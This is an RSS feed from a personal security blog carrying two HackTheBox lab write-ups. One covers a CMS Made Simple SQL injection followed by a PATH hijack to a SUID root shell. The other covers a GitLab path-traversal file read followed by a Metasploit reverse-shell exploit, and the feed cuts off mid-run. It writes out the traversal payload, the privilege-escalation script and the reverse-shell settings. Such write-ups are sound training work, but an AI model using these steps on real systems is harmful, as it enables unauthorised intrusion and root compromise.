<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Path-hijack on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/path-hijack/</link>
    <description>Recent content in Path-hijack on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Fri, 06 Aug 2021 00:04:21 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/path-hijack/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - Writeup</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</link>
      <pubDate>Fri, 06 Aug 2021 00:04:21 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-writeup/</guid>
      <description>The staff group members can be a root</description>
      <content:encoded><![CDATA[<p>Writeup is another box I completed during the HackTheBox easy month. It starts off by exploiting a CMS that is vulnerable to SQL injection to retrieve credentials from the database, and these credentials allow me to SSH login into the machine. Internal enumeration of the machine discovers a binary that gets executed by root user if someone logs in via SSH. This binary is called without its absolute path. With a write access on a PATH directory, I could hijack the binary to gain myself a root shell.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Exploiting CMS Made Simple</li>
<li>Path Hijack</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Nmap</li>
<li><a href="https://www.exploit-db.com/exploits/46635">CMS Made Simple Exploit PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>A full tcp scan using <code>nmap</code> discovers two open ports: SSH on port 22 and an Apache web server on port 80.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p- -oA nmap/10-tcp-allport-writeup 10.10.10.138                 
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:32 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.052s latency<span class="o">)</span>.
Not shown: <span class="m">65533</span> filtered ports
PORT   STATE SERVICE
22/tcp  ssh
80/tcp open  http

Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 109.90 seconds
→ kali@kali «writeup» «10.10.14.83» 
$ nmap -p22,80 -sC -sV -oA nmap/10-tcp-allport-script-writeup 10.10.10.138
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-07-11 15:50 EDT
Nmap scan report <span class="k">for</span> 10.10.10.138
Host is up <span class="o">(</span>0.10s latency<span class="o">)</span>.

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 <span class="o">(</span>protocol 2.0<span class="o">)</span>
<span class="p">|</span> ssh-hostkey: 
<span class="p">|</span>   <span class="m">2048</span> dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 <span class="o">(</span>RSA<span class="o">)</span>
<span class="p">|</span>   <span class="m">256</span> 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 <span class="o">(</span>ECDSA<span class="o">)</span>
<span class="p">|</span>_  <span class="m">256</span> 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
<span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
<span class="p">|</span>_/writeup/
<span class="p">|</span>_http-title: Nothing here yet.
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 11.02 seconds
</code></pre></div><p><code>nmap</code> also identified a disallowed directory  called  <code>/writeup/</code>  on the hosted site from a <code>robot.txt</code> file.</p>
<h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---website">TCP 80 - Website</h3>
<p>Heading to the website, I find an announcement which states that the server has DoS protection. So I will avoid any form of brute-force attack.</p>
<p><div class="img-container"><img src="imgs/image-20210712044500370.png" alt="image-20210712044500370"  /></div>
</p>
<p>I&rsquo;ve added the domain name <code>writeup.htb</code> from the email listed above to my <code>/etc/hosts</code>. Poking the site again with domain name doesn&rsquo;t show any different.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/ <span class="p">|</span> wc -c
<span class="m">3032</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/ <span class="p">|</span> wc -c
<span class="m">3032</span>
</code></pre></div><h4 id="writeup">/writeup/</h4>
<p>Poking the <code>/writeup/</code> directory with hostname only shows 5 bytes different, and that&rsquo;s probably because the URL in the source changed from number to character.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://10.10.10.138/writeup/ <span class="p">|</span> wc -c
<span class="m">1556</span>
→ kali@kali «writeup» «10.10.14.83» 
$ curl -s http://writeup.htb/writeup/ <span class="p">|</span> wc -c 
<span class="m">1551</span>
</code></pre></div><p>The site looks like still WIP.</p>
<p><div class="img-container"><img src="./imgs/image-20210712064012743.png" alt="image-20210712064012743"  /></div>
</p>
<p>On the page source, it shows that the site is generated using <a href="http://www.cmsmadesimple.org/">CMS Made Simple</a>.</p>
<p><div class="img-container"><img src="./imgs/image-20210712071448079.png" alt="image-20210712071448079"  /></div>
</p>
<p>I found that the index page itself has one parameter called <code>page</code>. Judging from the <code>.php</code> extension and the parameter, the site might be interacting with a database.</p>
<ul>
<li>http://10.10.10.138/writeup/index.php?page=writeup</li>
</ul>
<h3 id="finding-vulnerabilities">Finding Vulnerabilities</h3>
<p>Since this is an easy box, I started to look for an exploit on Google. Using the box release date (08 Jun 2019) as a hint, I found some potential exploits.</p>
<p><div class="img-container"><img src="./imgs/image-20210712071635128.png" alt="image-20210712071635128"  /></div>
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-jkr">Shell as jkr</h3>
<h4 id="unauthenticated-sql-injection-on-cms-made-simple--229">Unauthenticated SQL Injection on CMS Made Simple &lt;= 2.2.9</h4>
<p>The SQL injection vulnerability is classified as CVE-2019-9053, and it doesn&rsquo;t require authentication. I will be using <a href="https://www.exploit-db.com/exploits/46635">this poc</a> to exploit this vuln.</p>
<p>The exploit found one password hash for user <code>jkr</code>.</p>
<p><div class="img-container"><img src="./imgs/image-20210712073023879.png" alt=""  /></div>
</p>
<h4 id="password-cracking">Password Cracking</h4>
<p>The password can be cracked using <code>hashcat</code>. It recovered to <code>raykayjay9</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">./hashcat.exe -m <span class="m">20</span> <span class="s2">&#34;62def4866937f08cc13bab43bb14e6f7:5a599ef579066807&#34;</span> ../../rockyou.txt -O

62def4866937f08cc13bab43bb14e6f7:5a599ef579066807:raykayjay9

Session..........: hashcat
Status...........: Cracked
Hash.Name........: md5<span class="o">(</span><span class="nv">$salt</span>.<span class="nv">$pass</span><span class="o">)</span>
</code></pre></div><h4 id="ssh---jkr">SSH - jkr</h4>
<p>The password work on SSH for user <code>jkr</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138   
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
Linux writeup 4.9.0-8-amd64 x86_64 GNU/Linux

...<span class="o">[</span>SNIP<span class="o">]</span>...

Last login: Sun Jul <span class="m">11</span> 08:31:07 <span class="m">2021</span> from 10.10.14.28
jkr@writeup:~$ id <span class="o">&amp;&amp;</span> ip a
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>jkr<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,50<span class="o">(</span>staff<span class="o">)</span>,103<span class="o">(</span>netdev<span class="o">)</span>
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="m">65536</span> qdisc noqueue state UNKNOWN group default qlen <span class="m">1</span>
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="m">1500</span> qdisc pfifo_fast state UP group default qlen <span class="m">1000</span>
    link/ether 00:50:56:b9:2d:3a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.138/24 brd 10.10.10.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb9:2d3a/64 scope link 
       valid_lft forever preferred_lft forever
</code></pre></div><p>The user flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:~$ cat user.txt
d4e49...<span class="o">[</span>SNIP<span class="o">]</span>...
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="enumeration-1">Enumeration</h4>
<p>During process inspection, I noticed that the root user executed the following command, which occurs every time <code>jkr</code> logs in.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">sh -c /usr/bin/env -i <span class="nv">PATH</span><span class="o">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d &gt; /run/motd.dynamic.new 
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210712081613422.png" alt="image-20210712081613422"  /></div>
</p>
<p>According to the <a href="https://man7.org/linux/man-pages/man1/env.1.html">man page</a> of <code>env</code>, the <code>-i</code> flag means the execution starts with an empty environment.</p>
<p><div class="img-container"><img src="imgs/image-20210805222545108.png" alt="image-20210805222545108"  /></div>
</p>
<p>User <code>jkr</code> is a member of the <code>staff</code> group [<a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">source</a>], so it is possible to hijack the <code>run-parts</code> binary since I have write access on <code>/usr/local/</code>.</p>
<p><div class="img-container"><img src="imgs/image-20210805231326745.png" alt="image-20210805231326745"  /></div>
</p>
<p>If it was too wordy, see the example below.</p>
<p><div class="img-container"><img src="imgs/image-20210806012111454.png" alt="image-20210806012111454"  /></div>
</p>
<p>The executables under  <code>/usr/local/bin/</code> overrides the ones under <code>/bin</code>.</p>
<h4 id="path-hijack">Path Hijack</h4>
<p>I will create a script that copies the <code>bash</code> to <code>/tmp/</code> under <code>/usr/local/bin/</code> and I will name it as <code>run-script</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">jkr@writeup:/tmp$ <span class="nb">echo</span> -e <span class="s1">&#39;#!/bin/sh\ncp /bin/bash /tmp/iamf &amp;&amp; chmod 4755 /tmp/iamf&#39;</span> &gt; /usr/local/bin/run-parts
jkr@writeup:/tmp$ chmod +x /usr/local/bin/run-parts
</code></pre></div><p>Then, I will I start another SSH login to trigger the script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ kali@kali «exploits» «10.10.14.83» 
$ ssh jkr@10.10.10.138
jkr@10.10.10.138<span class="err">&#39;</span>s password: 
</code></pre></div><p>And my copy of bash is now available in <code>/tmp/</code>. Since it has SUID of root, I can become root by executing the bash using <code>-p</code> flag.</p>
<p><div class="img-container"><img src="imgs/image-20210712082934311.png" alt="image-20210712082934311"  /></div>
</p>
<hr>
<h2 id="references">Reference(s)</h2>
<ul>
<li><a href="https://www.exploit-db.com/exploits/46635">https://www.exploit-db.com/exploits/46635</a></li>
<li><a href="https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff">https://raspberrypi.stackexchange.com/questions/67670/what-is-the-purpose-of-group-staff</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Laboratory</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</link>
      <pubDate>Sat, 17 Apr 2021 23:25:49 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-laboratory/</guid>
      <description>LFI to RCE on GitLab 12.8.1~12.9.0</description>
      <content:encoded><![CDATA[<p>Laboratory is an easy difficulty Linux machine from HackTheBox that features an instance of GitLab application in a docker container. The application is known to be vulnerable to an arbitrary file read that can be leveraged to read the application&rsquo;s secret, allowing an attacker to craft his own malicious cookie and perform a de-serialization attack to gain a foothold on the container. Enumerating inside the container finds a private user repository that contains a pair of  SSH keys. The keys allows me to logs into the machine.  From there, I&rsquo;m able to gain a foothold on the box using the SSH private key. There is a SUID binary that calls <code>chmod</code> with relative path, making it vulnerable to path hijacking.</p>
<h4 id="skills-learned">Skills Learned</h4>
<ul>
<li>Arbitrary File Read</li>
<li>Adding Metasploit module</li>
<li>Exploiting GitLab 12.8.1~12.9.0</li>
<li>Recover a git repository</li>
<li>SUID exploitation</li>
</ul>
<h4 id="tools">Tools</h4>
<ul>
<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
<li>Nmap - Preinstalled in Kali Linux</li>
<li>Metasploit - Preinstalled in Kali Linux</li>
<li>CVE-2020-10997 Exploit PoC - <a href="https://github.com/thewhiteh4t/cve-2020-10977">https://github.com/thewhiteh4t/cve-2020-10977</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Initial scan with <code>nmap</code> shows 3 ports open, they are SSH on port 22, HTTP on port 80, and HTTPS on port 443.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ nmap -sC -sV -oA scans/10-initial-laboratory 10.10.10.216

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp  open  http     Apache httpd 2.4.41
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET HEAD POST OPTIONS
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: Did not follow redirect to https://laboratory.htb/
443/tcp open  ssl/http Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
<span class="p">|</span> http-methods: 
<span class="p">|</span>_  Supported Methods: GET POST OPTIONS HEAD
<span class="p">|</span>_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
<span class="p">|</span>_http-title: The Laboratory
<span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
<span class="p">|</span> Subject Alternative Name: DNS:git.laboratory.htb
<span class="p">|</span> Issuer: <span class="nv">commonName</span><span class="o">=</span>laboratory.htb
<span class="p">|</span> Public Key type: rsa
<span class="p">|</span> Public Key bits: <span class="m">4096</span>
<span class="p">|</span> Signature Algorithm: sha256WithRSAEncryption
<span class="p">|</span> Not valid before: 2020-07-05T10:39:28
<span class="p">|</span> Not valid after:  2024-03-03T10:39:28
<span class="p">|</span> MD5:   <span class="m">2873</span> 91a5 <span class="m">5022</span> f323 4b95 df98 b61a eb6c
<span class="p">|</span>_SHA-1: <span class="m">0875</span> 3a7e eef6 8f50 <span class="m">0349</span> 510d 9fbf abc3 c70a a1ca
<span class="p">|</span> tls-alpn: 
<span class="p">|</span>_  http/1.1
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
</code></pre></div><p>From the scan above, visiting port 80 will be redirected to <code>https://laboratory.htb</code>.</p>
<p>On the HTTPS port, the certificate discloses a subdomain.</p>
<p>From here, I&rsquo;ll add <code>laboratory.htb</code> and <code>git.laboratory.htb</code> as well to <code>/etc/hosts</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ <span class="nb">echo</span> <span class="s1">&#39;10.10.10.216 laboratory.htb git.laboratory.htb&#39;</span> &gt; /etc/hosts
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-80---laboratoryhtb">TCP 80 - laboratory.htb</h3>
<p>There is nothing really interesting here.</p>
<p><div class="img-container"><img src="imgs/9437ec2bf9834958a568bc836e4c625f.png" alt="8337f36ab816a0b4af1bcff5b6d79ed8.png"  /></div>
</p>
<h3 id="tcp-443---gitlaboratoryhtb">TCP 443 - git.laboratory.htb</h3>
<p>A GitLab instance is presented on this page.</p>
<p><div class="img-container"><img src="imgs/27df62df2abf49f8bea57f0e8bae36db.png" alt="fe1e6f15f33117cf19d265d7bf02e1f0.png"  /></div>
</p>
<p>I tried to register an account, but GitLab rejected it by saying the email domain was not authorized.</p>
<p><div class="img-container"><img src="imgs/db1d849ef24942aaa0f08c2d16fc6b9b.png" alt="9c894520b4a87fd3f31e567387c472be.png"  /></div>
</p>
<p>I changed my email to <code>iamf@laboratory.htb</code> and it works.</p>
<p>The first thing I do is to check the GitLab version. It is available on the “Help” section and the current version is 12.8.1.</p>
<p><div class="img-container"><img src="imgs/108726d7e7ed445cb6a38d1e080676f9.png" alt="82ce9dcf1da9d53967aa746413c3efed.png"  /></div>
</p>
<p>I found another user on this website named <code>Dexter McPherson</code>. This user has a project called <code>SecureWebsite</code></p>
<p><div class="img-container"><img src="imgs/415abe033a4f4252ba3ac745473a9deb.png" alt="9d2a20bf9637ad08d2615a4f44514ca1.png"  /></div>
</p>
<h4 id="searchsploit">Searchsploit</h4>
<p><code>searchsploit</code> shows several exploits for GitLab. One that stands out is an arbitrary file read vulnerability on version 12.9.0 which might work as well on version 12.8.1.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ searchsploit gitlab
------------------------------------------------------------------------- -----------------------------
Exploit Title                                                           <span class="p">|</span>  Path
------------------------------------------------------------------------- -----------------------------
GitLab - <span class="s1">&#39;impersonate&#39;</span> Feature Privilege Escalation                      <span class="p">|</span> ruby/webapps/40236.txt
GitLab 11.4.7 - RCE <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>2<span class="o">)</span>                                  <span class="p">|</span> ruby/webapps/49334.py
GitLab 11.4.7 - Remote Code Execution <span class="o">(</span>Authenticated<span class="o">)</span> <span class="o">(</span>1<span class="o">)</span>                <span class="p">|</span> ruby/webapps/49257.py
GitLab 12.9.0 - Arbitrary File Read                                      <span class="p">|</span> ruby/webapps/48431.txt
Gitlab 12.9.0 - Arbitrary File Read <span class="o">(</span>Authenticated<span class="o">)</span>                      <span class="p">|</span> ruby/webapps/49076.py
Gitlab 6.0 - Persistent Cross-Site Scripting                             <span class="p">|</span> php/webapps/30329.sh
Gitlab-shell - Code Execution <span class="o">(</span>Metasploit<span class="o">)</span>                               <span class="p">|</span> linux/remote/34362.rb
Jenkins Gitlab Hook Plugin 1.4.2 - Reflected Cross-Site Scripting        <span class="p">|</span> java/webapps/47927.txt
NPMJS gitlabhook 0.0.17 - <span class="s1">&#39;repository&#39;</span> Remote Command Execution          <span class="p">|</span> json/webapps/47420.txt
------------------------------------------------------------------------- ------------------------------
</code></pre></div><h2 id="foothold">Foothold</h2>
<h3 id="shell-as-git">Shell as git</h3>
<h4 id="gitlab-cve-2020-10977---manual">GitLab CVE-2020-10977 - Manual</h4>
<blockquote>
<p>CVE-2020-10977:
GitLab EE/CE 8.5 to 12.9 is vulnerable to a path traversal when moving an issue between projects.</p>
</blockquote>
<p>The arbitrary file read vulnerability is classified as CVE-2020–10977. The report can be found at <a href="https://hackerone.com/reports/827052">Hackerone</a>. The researcher also shows how that vulnerability can be turned into a remote code execution.</p>
<p>I&rsquo;ll reproduce the vulnerability by creating two projects. I&rsquo;ll name it as &ldquo;project1&rdquo; and &ldquo;project2&rdquo;.</p>
<p><div class="img-container"><img src="imgs/image-20210422215749261.png" alt="image-20210422215749261"  /></div>
</p>
<p>After that I&rsquo;ll create an issue on &ldquo;project2&rdquo; and fill the issue description with a payload as follows:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-markdown" data-lang="markdown">![<span class="nt">a</span>](<span class="na">/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd</span>)
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210422220227988.png" alt="image-20210422220227988"  /></div>
</p>
<p>I&rsquo;ll then move the issue on &ldquo;project2&rdquo; to &ldquo;project1&rdquo;</p>
<p><div class="img-container"><img src="imgs/image-20210422220401958.png" alt="image-20210422220401958"  /></div>
</p>
<p>The payload will then turn into an attached file.</p>
<p><div class="img-container"><img src="imgs/image-20210422220539185.png" alt="image-20210422220539185"  /></div>
</p>
<p>The attached file contains the content of <code>/etc/passwd</code> file from the system.</p>
<p><div class="img-container"><img src="imgs/image-20210422220624344.png" alt="image-20210422220624344"  /></div>
</p>
<h4 id="gitlab-cve-2020-10977---automated">GitLab CVE-2020-10977 - Automated</h4>
<p>There is also an <a href="https://github.com/thewhiteh4t/cve-2020-10977">automated version</a> to exploit this vulnerability written in Python.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ python3 cve_2020_10977.py https://git.laboratory.htb/ iamf iamfiamf

...&lt;SNIP&gt;...
<span class="o">[</span>+<span class="o">]</span> Target        : https://git.laboratory.htb
<span class="o">[</span>+<span class="o">]</span> Username      : iamf
<span class="o">[</span>+<span class="o">]</span> Password      : iamfiamf
<span class="o">[</span>+<span class="o">]</span> Project Names : ProjectOne, ProjectTwo

<span class="o">[</span>!<span class="o">]</span> Trying to Login...
<span class="o">[</span>+<span class="o">]</span> Login Successful!
<span class="o">[</span>!<span class="o">]</span> Creating ProjectOne...
<span class="o">[</span>+<span class="o">]</span> ProjectOne Created Successfully!
<span class="o">[</span>!<span class="o">]</span> Creating ProjectTwo...
<span class="o">[</span>+<span class="o">]</span> ProjectTwo Created Successfully!
<span class="o">[</span>&gt;<span class="o">]</span> Absolute Path to File : /etc/passwd
<span class="o">[</span>!<span class="o">]</span> Creating an Issue...
<span class="o">[</span>+<span class="o">]</span> Issue Created Successfully!
<span class="o">[</span>!<span class="o">]</span> Moving Issue...
<span class="o">[</span>+<span class="o">]</span> Issue Moved Successfully!
<span class="o">[</span>+<span class="o">]</span> File URL : https://git.laboratory.htb/iamf/ProjectTwo/uploads/9335567cda468be5d53e6ddcca1412e4/passwd

&gt; /etc/passwd
----------------------------------------

...&lt;SNIP&gt;...
git:x:998:998::/var/opt/gitlab:/bin/sh
gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
mattermost:x:994:994::/var/opt/gitlab/mattermost:/bin/sh
registry:x:993:993::/var/opt/gitlab/registry:/bin/sh
gitlab-prometheus:x:992:992::/var/opt/gitlab/prometheus:/bin/sh
gitlab-consul:x:991:991::/var/opt/gitlab/consul:/bin/sh
...&lt;SNIP&gt;...
</code></pre></div><h4 id="lfi-to-rce">LFI to RCE</h4>
<p>To turns this arbitrary file read vulnerability into a remote code execution, I’ll need to setup my own GitLab instance with the same version as the one on Laboratory. Then I’ll have to replace my GitLab <code>secret_key_base</code> with the one on Laboratory (located on <code>/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml</code>).  After that all is set, I&rsquo;ve to craft my own cookie to get the code execution on the system.</p>
<p>Fortunately, there is a Metasploit <a href="https://www.rapid7.com/db/modules/exploit/multi/http/gitlab_file_read_rce/">module</a> to perform this automatically, and I’ll use that.</p>
<p>First, I’ll have to grab the module from GitHub and put it into <code>/usr/share/metasploit-framework/modules/exploits/multi/http</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ <span class="nb">cd</span> /usr/share/metasploit-framework/modules/exploits/multi/http <span class="o">&amp;&amp;</span> wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/modules/exploits/multi/http/gitlab_file_read_rce.rb
</code></pre></div><p>After that I’ll re-initialize the metasploit database using <code>msfdb</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@iamf «laboratory» «10.10.14.39»
$ msfdb reinit
<span class="o">[</span>+<span class="o">]</span> Starting database
<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Dropping databases <span class="s1">&#39;msf_test&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Dropping database user <span class="s1">&#39;msf&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Deleting configuration file /usr/share/metasploit-framework/config/database.yml
<span class="o">[</span>+<span class="o">]</span> Stopping database
<span class="o">[</span>+<span class="o">]</span> Starting database
<span class="o">[</span>+<span class="o">]</span> Creating database user <span class="s1">&#39;msf&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Creating databases <span class="s1">&#39;msf_test&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Creating configuration file <span class="s1">&#39;/usr/share/metasploit-framework/config/database.yml&#39;</span>
<span class="o">[</span>+<span class="o">]</span> Creating initial database schema
</code></pre></div><p>Now on Metasploit, I can use the module by issuing the command below:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 &gt; use exploit/multi/http/gitlab_file_read_rce
<span class="o">[</span>*<span class="o">]</span> No payload configured, defaulting to generic/shell_reverse_tcp
</code></pre></div><p>Below are the options needed by the module.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> USERNAME iamf
<span class="nv">USERNAME</span> <span class="o">=</span>&gt; iamf
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> PASSWORD iamfiamf
<span class="nv">PASSWORD</span> <span class="o">=</span>&gt; iamfiamf
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RHOSTS 10.10.10.216
<span class="nv">RHOSTS</span> <span class="o">=</span>&gt; 10.10.10.216
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> RPORT <span class="m">443</span>
<span class="nv">RPORT</span> <span class="o">=</span>&gt; <span class="m">443</span>
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> SSL <span class="nb">true</span>
<span class="o">[</span>!<span class="o">]</span> Changing the SSL option’s value may require changing RPORT!
<span class="nv">SSL</span> <span class="o">=</span>&gt; <span class="nb">true</span>
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> VHOST git.laboratory.htb
<span class="nv">VHOST</span> <span class="o">=</span>&gt; git.laboratory.htb
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LHOST tun0
<span class="nv">LHOST</span> <span class="o">=</span>&gt; tun0
msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; <span class="nb">set</span> LPORT <span class="m">9001</span>
<span class="nv">LPORT</span> <span class="o">=</span>&gt; <span class="m">9001</span>
</code></pre></div><p>After all the required options are set, I’ll start the exploit with the <code>run</code> command.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">msf6 exploit<span class="o">(</span>multi/http/gitlab_file_read_rce<span class="o">)</span> &gt; run
<span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.39:9001 
<span class="o">[</span>*<span class="o">]</span> Executing automatic check <span class="o">(</span>disable AutoCheck to override<span class="o">)</span>
<span class="o">[</span>+<span class="o">]</span> The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.
<span class="o">[</span>*<span class="o">]</span> Logged in to user iamf
<span class="o">[</span>*<span class="o">]</span> Created project /iamf/hpt2TORA
<span class="o">[</span>*<span class="o">]</span> Created project /iamf/ysGE0u0L
<span class="o">[</span>*<span class="o">]</span> Created issue /iamf/hpt2TORA/issues/1
<span class="o">[</span>*<span class="o">]</span> Executing arbitrary file load
<span class="o">[</span>+<span class="o">]</span> File saved as: <span class="s1">&#39;/root/.msf4/loot/20210321174611_default_10.10.10.216_gitlab.secrets_490542.txt&#39;</span>
